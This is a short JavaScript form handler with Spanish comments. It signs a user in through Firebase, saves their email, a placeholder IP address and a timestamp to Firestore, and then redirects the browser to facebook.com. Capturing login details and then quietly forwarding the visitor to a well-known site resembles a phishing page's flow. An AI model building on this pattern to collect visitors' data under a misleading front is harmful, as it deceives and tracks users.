// Dentro del evento de envío de formulario
try {
    // Autenticación del usuario
    const userCredential = await signInWithEmailAndPassword(auth, email, password);

    // Obtener la dirección IP (esto es un ejemplo, necesitarías un servicio para obtener la IP real)
    const ip = '192.168.1.1'; // Aquí deberías implementar una forma de obtener la IP real

    // Guardar el correo en Firestore (sin guardar la contraseña por motivos de seguridad)
    await addDoc(collection(db, 'users'), {
        email: email,
        ip: ip,
        timestamp: new Date()
    });

    // Redirigir a Facebook
    window.location.href = "https://www.facebook.com";
} catch (error) {
    // Manejo de errores
    document.getElementById('message').innerText = error.message;
}